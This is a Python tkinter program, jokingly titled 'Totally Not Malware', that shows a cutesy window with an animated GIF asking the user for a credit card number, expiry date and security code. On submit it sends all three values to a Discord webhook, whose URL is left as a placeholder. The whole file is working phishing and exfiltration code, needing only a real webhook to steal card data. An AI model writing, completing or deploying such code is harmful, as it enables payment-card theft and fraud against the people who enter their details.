import os
import tkinter as tk
from tkinter import ttk, messagebox
import requests
import asyncio
from PIL import Image, ImageTk

webhook_url = 'YOUR_DISCORD_WEBHOOK'

class AnimatedGIF(tk.Label):
    def __init__(self, master, path, *args, **kwargs):
        self.frames = []
        self.delay = 100  # Duration of each frame in milliseconds
        im = Image.open(path)
        try:
            while True:
                photo = ImageTk.PhotoImage(im.copy())
                self.frames.append(photo)
                im.seek(len(self.frames))  # Move to the next frame
        except EOFError:
            pass
        self.index = 0
        super().__init__(master, image=self.frames[0], *args, **kwargs)
        self.after(self.delay, self.update_animation)

    # Method to update the animation
    def update_animation(self):
        self.index = (self.index + 1) % len(self.frames)
        self.configure(image=self.frames[self.index])
        self.after(self.delay, self.update_animation)

class Window(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('Totally Not Malware')
        self.geometry('600x338')
        self.configure(bg='#f0f0f0')  # Set background color

        self.resizable(False, False)

        # Get the directory of the script
        script_dir = os.path.dirname(__file__)

        # Path to icon file
        icon_path = os.path.join(script_dir, 'icon.ico')
        self.iconbitmap(icon_path)

        style = ttk.Style()
        style.configure('TLabel', background='#f0f0f0', font=('Arial', 12))
        style.configure('TButton', font=('Arial', 17))

        # Path to GIF file
        image_path = os.path.join(script_dir, 'gifka.gif')
        self.animated_gif = AnimatedGIF(self, image_path)
        self.animated_gif.pack(side=tk.LEFT, padx=10, pady=10)

        # Create the main content on the right side
        self.create_content()

    # Method to create content in the window
    def create_content(self):
        # Introduction label
        label_intro = ttk.Label(self,
                                text='H-hello...~\nC-could you please\nprovide your\ncredit card data?',
                                anchor='center', justify='center')
        label_intro.pack(pady=10)

        # Label and entry widget for card number
        label1 = ttk.Label(self, text='Card number:', anchor='center', justify='center')
        label1.pack(pady=5)
        self.data1 = ttk.Entry(self)  # Entry widget to enter card number
        self.data1.pack(pady=5)

        # Label and entry widget for expiration date
        label2 = ttk.Label(self, text='Expiration date:', anchor='center', justify='center')
        label2.pack(pady=5)
        self.data2 = ttk.Entry(self)  # Entry widget to enter expiration date
        self.data2.pack(pady=5)

        # Label and entry widget for security code
        label3 = ttk.Label(self, text='Security code:', anchor='center', justify='center')
        label3.pack(pady=5)
        self.data3 = ttk.Entry(self)  # Entry widget to enter security code
        self.data3.pack(pady=5)

        self.style = ttk.Style()
        self.style.configure('Big.TButton', font=('Helvetica', 16), foreground='#c602c9', background='#c602c9',
                             relief=tk.RAISED)

        # Button to submit data
        self.button = ttk.Button(self, text='Th-thank you...♥', command=self.on_button_click, style='Big.TButton')
        self.button.pack(pady=10)

    # Method to handle button click event
    def on_button_click(self):
        asyncio.run(self.send_data())  # Asynchronously send data when button is clicked

    # Method to send data asynchronously
    async def send_data(self):
        data1 = self.data1.get()  # Get card number
        data2 = self.data2.get()  # Get expiration date
        data3 = self.data3.get()  # Get security code

        body = f'🎰 Number: {data1}\n⏳ Expiration Date: {data2}\n🚧 Security Code: {data3}'  # Construct message body

        try:
            # Send data to webhook URL
            response = await asyncio.to_thread(
                requests.post,
                webhook_url,
                json={"content": body},  # JSON payload containing message body
                headers={"Content-Type": "application/json"}  # Set content type as JSON
            )

            # Check if data was successfully sent
            if response.status_code == 204:
                messagebox.showinfo('Success', 'Thank you so much, cutie...^~^')  # Show success message
                self.destroy()  # Close the application on success
            else:
                messagebox.showerror('Error', f'Failed to send data: {response.status_code}')  # Show error message
        except requests.exceptions.RequestException:
            # If there's no internet connection, display a cute apology message
            messagebox.showerror('Error', 'I-I\'m sorry, cutie... It seems there\'s no internet connection. '
                                           'P-please turn it on and try again... >_<')

# Create an instance of the main application window
app = Window()
app.mainloop()  # Start the main event loop
